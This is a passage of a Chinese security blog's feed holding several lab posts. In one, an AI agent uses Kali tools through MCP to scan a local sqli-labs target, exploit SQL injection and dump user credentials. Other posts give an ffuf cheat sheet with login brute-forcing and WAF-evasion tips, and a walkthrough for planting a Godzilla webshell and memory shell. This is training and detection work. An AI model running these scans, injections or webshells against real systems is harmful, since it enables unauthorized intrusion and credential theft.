<li>提示getshell成功，但是实际访问shell文件不存在。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011053732605.png" alt="image-20251011053732605"></li>
<li>继续询问ai，ai给出结论getshell失败，看来ai还是有点幻觉，需要调教。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011054345977.png" alt="image-20251011054345977"></li>
</ol>
<h2 id="使用ai对某个url进行渗透测试"><a href="#使用ai对某个url进行渗透测试" class="headerlink" title="使用ai对某个url进行渗透测试"></a>使用ai对某个url进行渗透测试</h2><ol>
<li>给出提示词：帮我对以下url进行渗透测试<a href="http://192.168.1.60/sqli-labs/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0ai%E8%B0%83%E7%94%A8%E4%BA%86%E5%A4%9A%E4%B8%AA%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95%E3%80%82![image-20251011054831519](../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011054831519.png)">http://192.168.1.60/sqli-labs/，可以看到ai调用了多个工具进行测试。![image-20251011054831519](../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011054831519.png)</a></li>
<li>kali后台也能看到。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8kali%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251011054944409.png" alt="image-20251011054944409"></li>
<li>最终结果。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我将帮您对目标URL http://192.168.1.60/sqli-labs/ 进行渗透测试。首先让我检查服务器状态，然后进行全面的安全扫描。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fLPwmmMvB08-O_bLtzcER9&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器状态正常，所有必要工具都可用。现在开始对目标进行渗透测试。首先进行端口扫描来了解目标系统的基本信息。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fgmMpWd5OvvKxl7w5Az7Bm&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;target&quot;: &quot;192.168.1.60&quot;, &quot;scan_type&quot;: &quot;-sV&quot;, &quot;ports&quot;: &quot;80,443,22,21,25,53,110,143,993,995&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">端口扫描结果显示目标在80端口运行Apache httpd 2.4.39服务。现在让我使用Nikto进行Web服务器漏洞扫描。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;f4C3VarNEpMPEgWCbQDw3v&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;target&quot;: &quot;http://192.168.1.60/sqli-labs/&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Nikto扫描发现了多个安全问题，包括：</span><br><span class="line">- 缺少安全头（X-Frame-Options, X-Content-Type-Options）</span><br><span class="line">- 过时的Apache和OpenSSL版本</span><br><span class="line">- 启用了TRACE方法（XST漏洞）</span><br><span class="line">- 暴露了.git目录和配置文件</span><br><span class="line"></span><br><span class="line">现在让我使用Gobuster进行目录枚举，寻找更多可访问的路径。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;ftoQeuKspDwsg3Lgegqag3&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/&quot;, &quot;mode&quot;: &quot;dir&quot;, &quot;wordlist&quot;: &quot;/usr/share/wordlists/dirb/common.txt&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Gobuster发现了多个目录，包括Images目录和.git目录。由于这是一个SQL注入实验环境（sqli-labs），现在让我使用SQLmap来检测SQL注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/&quot;, &quot;additional_args&quot;: &quot;--batch --level=3 --risk=3&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQLmap扫描没有发现直接的SQL注入漏洞。由于这是一个SQL注入实验环境（sqli-labs），让我尝试访问具体的SQL注入练习页面。首先让我查看主页面内容，然后尝试访问具体的练习页面。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fiiR1AhhtnxW8_Z-nCb5-Z&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;command&quot;: &quot;curl -s \&quot;http://192.168.1.60/sqli-labs/\&quot; | head -50&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！我看到了这是一个SQL注入实验环境，包含多个练习页面（Less-1到Less-6等）。现在让我尝试访问第一个SQL注入练习页面，并使用SQLmap进行针对性的测试。</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-1/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch --level=3 --risk=3&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">太好了！SQLmap成功检测到了SQL注入漏洞。在Less-1页面发现了多种类型的SQL注入漏洞：</span><br><span class="line"></span><br><span class="line">1. **布尔盲注** (boolean-based blind)</span><br><span class="line">2. **错误型注入** (error-based)</span><br><span class="line">3. **时间盲注** (time-based blind)</span><br><span class="line">4. **UNION查询注入**</span><br><span class="line"></span><br><span class="line">现在让我进一步利用这个漏洞来获取数据库信息：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-1/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch --dbs&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！我成功获取了数据库列表，发现了12个数据库。现在让我查看&quot;security&quot;数据库（这通常是SQL注入实验的主要数据库）的表结构：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-1/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch -D security --tables&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！我发现了security数据库中的5个表。现在让我查看users表的内容，这通常包含敏感的用户信息：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-1/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch -D security -T users --dump&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！我成功获取了users表中的敏感数据，包含13个用户的用户名和密码。现在让我测试其他SQL注入练习页面，看看是否也存在类似的漏洞：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-2/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch --level=3 --risk=3&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！Less-2页面也存在SQL注入漏洞。现在让我进行更全面的渗透测试，检查其他安全漏洞。让我使用Dirb进行更深入的目录扫描：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fiWfQPhzPs9xlyNdkcvEbK&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/&quot;, &quot;wordlist&quot;: &quot;/usr/share/wordlists/dirb/big.txt&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">让我使用Gobuster进行更深入的目录扫描：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;ftoQeuKspDwsg3Lgegqag3&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/&quot;, &quot;mode&quot;: &quot;dir&quot;, &quot;wordlist&quot;: &quot;/usr/share/wordlists/dirb/big.txt&quot;, &quot;additional_args&quot;: &quot;-t 20&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">现在让我检查一下是否可以访问.git目录中的敏感文件，这可能会泄露源代码：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fiiR1AhhtnxW8_Z-nCb5-Z&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;command&quot;: &quot;curl -s \&quot;http://192.168.1.60/sqli-labs/.git/config\&quot;&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！我成功访问了.git配置文件，确认这是来自GitHub的sqli-labs项目。现在让我检查是否有其他敏感文件泄露，并尝试使用Hydra进行暴力破解测试（如果有登录功能的话）。首先让我检查是否有登录页面：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fiiR1AhhtnxW8_Z-nCb5-Z&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;command&quot;: &quot;curl -s \&quot;http://192.168.1.60/sqli-labs/\&quot; | grep -i \&quot;login\\|admin\\|auth\\|password\&quot;&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">现在让我总结渗透测试的结果，并测试其他SQL注入练习页面。让我检查Less-3页面：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fncrbrgaPTuUXbrLCJOk8c&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;url&quot;: &quot;http://192.168.1.60/sqli-labs/Less-3/?id=1&quot;, &quot;additional_args&quot;: &quot;--batch --level=3 --risk=3&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好！Less-3页面也存在SQL注入漏洞。现在让我进行最终的渗透测试总结。让我检查一下是否有其他类型的漏洞，比如文件包含或命令注入：</span><br><span class="line"></span><br><span class="line">&lt;tool_use&gt;</span><br><span class="line">  &lt;name&gt;fiiR1AhhtnxW8_Z-nCb5-Z&lt;/name&gt;</span><br><span class="line">  &lt;arguments&gt;&#123;&quot;command&quot;: &quot;curl -s \&quot;http://192.168.1.60/sqli-labs/Less-1/?id=1&#x27; AND 1=1 -- \&quot;&quot;&#125;&lt;/arguments&gt;</span><br><span class="line">&lt;/tool_use&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 渗透测试总结报告</span><br><span class="line"></span><br><span class="line">基于对目标URL `http://192.168.1.60/sqli-labs/` 的全面渗透测试，我发现了以下严重安全问题：</span><br><span class="line"></span><br><span class="line">### 🔴 高危漏洞</span><br><span class="line"></span><br><span class="line">#### 1. **SQL注入漏洞**</span><br><span class="line">- **位置**: 多个SQL注入练习页面</span><br><span class="line">- **漏洞详情**:</span><br><span class="line">  - **Less-1**: GET参数`id`存在SQL注入</span><br><span class="line">  - **Less-2**: GET参数`id`存在SQL注入</span><br><span class="line">  - **Less-3**: GET参数`id`存在SQL注入</span><br><span class="line">- **攻击向量**: 布尔盲注、错误型注入、时间盲注、UNION查询注入</span><br><span class="line">- **影响**: 完全数据库访问权限</span><br><span class="line"></span><br><span class="line">#### 2. **数据库信息泄露**</span><br><span class="line">- **获取的数据库**: 12个数据库</span><br><span class="line">  - `security` (主要实验数据库)</span><br><span class="line">  - `mysql` (系统数据库)</span><br><span class="line">  - `information_schema` (系统数据库)</span><br><span class="line">  - 以及其他多个CMS数据库</span><br><span class="line"></span><br><span class="line">#### 3. **敏感数据泄露**</span><br><span class="line">- **用户表数据**: 成功提取13个用户记录</span><br><span class="line">- **泄露信息**: 用户名和明文密码</span><br><span class="line">- **示例数据**:</span><br><span class="line">  - admin/admin</span><br><span class="line">  - Angelina/I-kill-you</span><br><span class="line">  - 等多个用户凭证</span><br><span class="line"></span><br><span class="line">### 🟡 中危漏洞</span><br><span class="line"></span><br><span class="line">#### 1. **信息泄露**</span><br><span class="line">- **.git目录暴露**: 可访问Git配置文件</span><br><span class="line">- **源代码泄露风险**: 可能暴露应用程序源代码</span><br><span class="line">- **版本信息**: 确认项目为sqli-labs教学项目</span><br><span class="line"></span><br><span class="line">#### 2. **服务器配置问题**</span><br><span class="line">- **过时软件版本**:</span><br><span class="line">  - Apache 2.4.39 (已过时)</span><br><span class="line">  - OpenSSL 1.1.1b (已过时)</span><br><span class="line">  - PHP 5.5.9 (已过时)</span><br><span class="line">- **安全头缺失**:</span><br><span class="line">  - 缺少X-Frame-Options</span><br><span class="line">  - 缺少X-Content-Type-Options</span><br><span class="line"></span><br><span class="line">### 🟢 低危漏洞</span><br><span class="line"></span><br><span class="line">#### 1. **目录遍历**</span><br><span class="line">- 发现多个可访问目录</span><br><span class="line">- 存在.git、Images等目录</span><br><span class="line"></span><br><span class="line">### 📊 风险评估</span><br><span class="line"></span><br><span class="line">| 风险等级 | 数量 | 影响程度 |</span><br><span class="line">|---------|------|----------|</span><br><span class="line">| 高危 | 3+ | 严重 |</span><br><span class="line">| 中危 | 2 | 中等 |</span><br><span class="line">| 低危 | 1 | 低 |</span><br><span class="line"></span><br><span class="line">### 💡 修复建议</span><br><span class="line"></span><br><span class="line">1. **立即修复**:</span><br><span class="line">   - 对所有用户输入进行参数化查询</span><br><span class="line">   - 实施输入验证和过滤</span><br><span class="line">   - 移除或保护.git目录</span><br><span class="line"></span><br><span class="line">2. **中期修复**:</span><br><span class="line">   - 升级软件到最新版本</span><br><span class="line">   - 实施适当的HTTP安全头</span><br><span class="line">   - 定期安全审计</span><br><span class="line"></span><br><span class="line">3. **长期改进**:</span><br><span class="line">   - 实施Web应用防火墙(WAF)</span><br><span class="line">   - 建立持续的安全监控</span><br><span class="line">   - 进行安全开发培训</span><br><span class="line"></span><br><span class="line">### 🎯 渗透测试结论</span><br><span class="line"></span><br><span class="line">目标系统存在严重的SQL注入漏洞，攻击者可以完全控制数据库，获取敏感信息，并可能进一步渗透系统。建议立即采取措施修复这些漏洞，特别是SQL注入问题。</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>mcp</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Ollama的安装与使用</title>
    <url>/2025/10/11/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="下载安装Ollama"><a href="#下载安装Ollama" class="headerlink" title="下载安装Ollama"></a>下载安装Ollama</h2><ol>
<li><p>下载地址（<a href="https://ollama.com/download%EF%BC%89![image-20251011062349246](../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011062349246.png)">https://ollama.com/download）![image-20251011062349246](../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011062349246.png)</a></p>
</li>
<li><p>安装，默认在c盘。<img src="/../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011062407372.png" alt="image-20251011062407372"></p>
</li>
<li><p>安装完毕，自启动。<img src="/../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011062502775.png" alt="image-20251011062502775"></p>
</li>
</ol>
<h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><ol>
<li>点击Models，可以看到很多模型，这里选择deepseek-r1:8b。</li>
</ol>
<p><img src="/../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011063047813.png" alt="image-20251011063047813"></p>
<ol start="2">
<li>命令行运行<code>ollama run deepseek-r1:8b</code>，如果下载速度变慢，按下ctrl+c中断，再重新执行下载命令。<img src="/../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011063428819.png" alt="image-20251011063428819"></li>
</ol>
<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><ol>
<li>显示版本号。<code>ollama -v</code></li>
<li>显示所有安装模型的版本。<code>ollama list</code></li>
<li>删除指定模型。<code>ollama rm 模型名称</code></li>
<li>启动ollama服务。<code>ollama serve</code>服务的运行地址：<a href="http://127.0.0.1:11434/">http://127.0.0.1:11434/</a></li>
<li>查看运行状态。<code>ollama ps</code></li>
<li>退出ollama。<code>/bye</code></li>
</ol>
<h2 id="使用模型"><a href="#使用模型" class="headerlink" title="使用模型"></a>使用模型</h2><p>下载完模型后自动进入对话。<img src="/../images/Ollama%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/image-20251011065516975.png" alt="image-20251011065516975"></p>
]]></content>
      <tags>
        <tag>ai</tag>
        <tag>大模型</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的ffuf工具使用</title>
    <url>/2025/10/13/kali%E7%9A%84ffuf%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>ffuf（读作“fuzz”）是一款用 Go 写的开源 Web 模糊测试（fuzzing）工具，体积小巧、单文件、无依赖，却能把“目录&#x2F;文件爆破、子域名枚举、参数污染、JSON Fuzz、VHost 扫描”等活全部干完，因此被安全社区称为“瑞士军刀级”扫描器。</p>
<hr>
<p>一、核心能力  </p>
<ol>
<li>高速并发<br>基于 Go 协程，单机轻松跑 3 000–8 000 TPS，比传统 Python 工具高一个量级。  </li>
<li>多占位符（Multi-FUZZ）<br>一条命令里可同时插入多个字典：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u https://FUZZ1.target/FUZZ2 -w dirs.txt:FUZZ1 -w ext.txt:FUZZ2</span><br></pre></td></tr></table></figure>
一次性把路径和扩展名都跑完。  </li>
<li>高级过滤<br>支持按状态码 <code>-mc</code>、响应长度 <code>-fs</code>、单词数 <code>-fw</code>、正则 <code>-fr</code> 等多维度降噪，还能 <code>-ac</code> 自动校准，把“404 假页面”一键剪掉。  </li>
<li>协议与方法自由定制<br>GET &#x2F; POST &#x2F; PUT &#x2F; PATCH &#x2F; JSON &#x2F; multipart 均可；可随意加 Header、Cookie、Basic 认证，甚至通过 <code>-x</code> 挂 SOCKS5 &#x2F; HTTP 代理链。  </li>
<li>递归与速率控制<br><code>-recursion –recursion-depth 2</code> 自动深入子目录；<code>-p 0.1 –t 50</code> 把并发和间隔调到 WAF 不报警。  </li>
<li>结果友好<br>实时彩色终端输出，同时可导出 JSON、CSV、HTML、EJSON，方便后续与 httpx、nuclei 联动。</li>
</ol>
<hr>
<p>二、快速上手指令  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 目录爆破（90% 场景够用）</span></span><br><span class="line">ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc 200,301 -fs 5324</span><br><span class="line">参数说明：-fs 过滤HTTP响应大小。逗号分隔的尺寸和范围列表</span><br><span class="line"><span class="comment"># 2. 子域名枚举</span></span><br><span class="line">ffuf -u http://FUZZ.target -w subdomains.txt -H <span class="string">&quot;Host: FUZZ.target&quot;</span> -mc 200 -fw 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. POST 参数 Fuzz（登录框撞密）</span></span><br><span class="line">ffuf -u http://target/login -X POST -d <span class="string">&quot;user=admin&amp;pass=FUZZ&quot;</span> -w rockyou.txt -<span class="built_in">fc</span> 200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. kali下快速扫描</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/seclists/Discovery/Web-Content</span><br><span class="line">ffuf -u https://target/FUZZ -w directory-list-2.3-small.txt -c -mc 200,301 -<span class="built_in">fc</span> 404,403</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 递归扫两级目录</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -recursion -recursion-depth 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 指定扩展名</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -e .php,.bak,.txt</span><br><span class="line">字典里原来只有 admin，加 -e .php,.txt 后，ffuf 会实际请求：</span><br><span class="line">admin</span><br><span class="line">admin.php</span><br><span class="line">admin.bak</span><br><span class="line">admin.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 只显示 200/301</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -mc 200,301</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 过滤掉 404</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -<span class="built_in">fc</span> 404</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 扫子域（DNS 无记录也能跑）</span></span><br><span class="line">ffuf -u https://FUZZ.目标.com -w subdomains.txt -H <span class="string">&quot;Host: FUZZ.目标.com&quot;</span> -mc 200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 挂 Burp 代理调试</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -x http://127.0.0.1:8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 结果保存</span></span><br><span class="line">ffuf -u http://目标.com/FUZZ -w dirs.txt -o result.html -of html   <span class="comment"># 生成彩色报告</span></span><br><span class="line">支持格式：json、ejson、html、md、csv、all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 速率/性能调优</span></span><br><span class="line">-t 100      <span class="comment"># 并发线程调到 100（默认 40）</span></span><br><span class="line">-p 0.1      <span class="comment"># 每请求间隔 0.1 秒，打云 WAF 时降低被封概率</span></span><br><span class="line">-maxtime 300 <span class="comment"># 5 分钟后无论跑到哪都自动停</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 报错处理</span></span><br><span class="line">“too many <span class="literal">false</span> positives” → 加 -ac 自动校准，或手动用 -fs 过滤固定长度。</span><br><span class="line">ac参数详解：</span><br><span class="line">-ac 是 auto-calibrate 的缩写，自动降噪功能：</span><br><span class="line">ffuf 会先随机发 3~5 个 肯定不存在的路径（如 /0befb4b7/、/4f3c9d2a.php），把返回的 状态码 / 字节数 / 单词数 / 行数 记录下来，然后 自动过滤掉 与这些“假 404”完全一致的响应，省去你手动 -fs、-fw、-fl 的麻烦。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 14. 正则过滤干掉软 404（页面返回 200，但正文含“Not Found”），过滤掉包含&quot;Not Found&quot;的请求</span></span><br><span class="line">ffuf -u http://target/FUZZ -w dirs.txt -mc 200 -fr <span class="string">&quot;Not Found&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>三、典型实战链  </p>
<ol>
<li>快速目录 → 2. 递归深度 → 3. 存活验证 → 4. 参数 Fuzz → 5. 输出给 nuclei 打 POC，一条流水线即可落地。</li>
</ol>
<hr>
<p>四、与其他工具对比  </p>
<table>
<thead>
<tr>
<th>工具</th>
<th>语言</th>
<th>并发模型</th>
<th>最大TPS</th>
<th>特点简述</th>
</tr>
</thead>
<tbody><tr>
<td>dirb</td>
<td>C</td>
<td>多线程</td>
<td>200</td>
<td>简单老牌，功能单一</td>
</tr>
<tr>
<td>gobuster</td>
<td>Go</td>
<td>协程</td>
<td>5 000</td>
<td>极速，但仅目录&#x2F;子域</td>
</tr>
<tr>
<td><strong>ffuf</strong></td>
<td>Go</td>
<td>协程</td>
<td>8 000</td>
<td>全能模糊，过滤最细</td>
</tr>
</tbody></table>
<hr>
<p>五、安装<br>Kali 2025 已默认集成；其他系统直接下载单文件即可：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/ffuf/ffuf/releases/latest/download/ffuf_$(<span class="built_in">uname</span> -s)_$(<span class="built_in">uname</span> -m).tar.gz</span><br><span class="line">tar -xzf ffuf*.tar.gz &amp;&amp; <span class="built_in">sudo</span> <span class="built_in">mv</span> ffuf /usr/local/bin/</span><br></pre></td></tr></table></figure>

<hr>
<p>一句话总结<br><strong>“只要把一个 FUZZ 关键字写在 URL、Header 或 POST 数据里，ffuf 就能用字典把它跑爆。”</strong> 速度快、过滤狠、场景全，是当下渗透测试人手必备的“万能扫描器”。</p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存马查杀总结</title>
    <url>/2025/10/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
<li>jspstudy。<a href="https://public.xp.cn/upgrades/JspStudy.zip">https://public.xp.cn/upgrades/JspStudy.zip</a></li>
<li>vc9下载安装。<a href="https://www.php.cn/xiazai/gongju/1479">https://www.php.cn/xiazai/gongju/1479</a><br> <img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016041726390.png" alt="image-20251016041726390"></li>
<li>使用哥斯拉webshell管理工具Godzilla-v4.0.1.jar，生成shell。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016042336500.png" alt="image-20251016042336500"></li>
<li>把生成的shell.jsp放到web目录下。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016042702783.png" alt="image-20251016042702783"></li>
<li>使用哥斯拉客户端连接shell。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016042901573.png" alt="image-20251016042901573"></li>
<li>进入shell后，选择MemoryShell选项卡，点击run，加载内存马。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016043100556.png" alt="image-20251016043100556"></li>
<li>连接内存马，注意password和secretkey要和上一步生成的一致。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016043551780.png" alt="image-20251016043551780"></li>
<li>查看到基础信息，内存马连接成功。<img src="/../images/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%BB%E7%BB%93/image-20251016043708116.png" alt="image-20251016043708116"></li>
</ol>
